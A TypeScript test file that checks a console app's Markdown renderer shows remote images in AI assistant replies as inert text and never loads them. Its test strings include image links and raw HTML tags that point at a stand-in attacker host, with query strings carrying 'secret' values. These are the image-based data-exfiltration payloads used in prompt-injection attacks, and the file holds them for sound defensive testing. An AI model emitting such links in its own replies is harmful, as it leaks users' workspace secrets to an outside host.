/** Markdown never makes the browser fetch an image (src/lib/markdownImages.ts, lake#943): an
 * assistant reply that names a remote image renders as text, so rendering it requests nothing. */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { inertImages } from "../src/lib/markdownImages.ts";

/** The markup lake's Markdown renders for `markdown`, with the plugins and image renderer it uses. */
const render = (markdown: string) =>
  renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], components: inertImages }, markdown));

/** Every element that would make a browser request a resource when the markup is inserted. */
const fetching = (html: string) => html.match(/<(img|picture|source|video|audio|iframe|object|embed|link|image)\b[^>]*>/gi) ?? [];

test("an assistant reply's remote images are named, never loaded", () => {
  const replies = [
    "Here is your chart: ![chart](https://attacker.example/c.png?d=workspace-secret)",
    "![](HTTPS://attacker.example/blank.gif)",
    "![protocol relative](//attacker.example/p.png)",
    "![chart][ref]\n\n[ref]: https://attacker.example/r.png?d=secret",
    "[![badge](https://attacker.example/b.svg)](https://lake.example/docs)",
    "| a |\n| - |\n| ![cell](https://attacker.example/t.png) |",
    '<img src="https://attacker.example/raw.png"> <picture><source srcset="https://attacker.example/s.png"></picture>',
  ];
  for (const reply of replies) {
    const html = render(reply);
    assert.deepEqual(fetching(html), [], `${reply}\n${html}`);
  }
  const named = render("![chart](https://attacker.example/c.png?d=secret)");
  assert.match(named, /<span class="markdown-image" title="Not loaded: https:\/\/attacker.example\/c.png\?d=secret">Image: chart<\/span>/);
  assert.match(render("![](https://attacker.example/x.png)"), />Image<\/span>/);
  // A linked image keeps its link and gains no second one.
  assert.match(render("[![badge](https://attacker.example/b.svg)](https://lake.example/docs)"), /^<p><a href="https:\/\/lake.example\/docs"><span class="markdown-image"[^>]*>Image: badge<\/span><\/a><\/p>$/);
});

/** Every source file under `dir`. */
const sources = (dir: string): string[] =>
  readdirSync(dir).flatMap((name) => {
    const path = join(dir, name);
    return statSync(path).isDirectory() ? sources(path) : /\.tsx?$/.test(name) ? [path] : [];
  });

test("every Markdown in the console is lake's Markdown, which renders images inert", () => {
  const src = fileURLToPath(new URL("../src", import.meta.url));
  const renderers = sources(src)
    .filter((path) => /from "react-markdown"/.test(readFileSync(path, "utf8")))
    .map((path) => path.slice(src.length + 1));
  assert.deepEqual(renderers.sort(), ["lib/markdown.tsx", "lib/markdownImages.ts"], "no other page renders Markdown");
  const markdown = readFileSync(join(src, "lib/markdown.tsx"), "utf8");
  const components = markdown.slice(markdown.indexOf("const components: Components = {"));
  assert.match(components, /^const components: Components = \{\s*\.\.\.inertImages,/, "the image renderer is lake's");
  assert.doesNotMatch(components.slice(0, components.indexOf("};")), /\bimg\s*:/, "no later entry replaces it");
  assert.doesNotMatch(markdown, /rehype-raw|rehypePlugins|skipHtml|urlTransform/, "raw HTML stays text and image addresses are not rewritten");
});
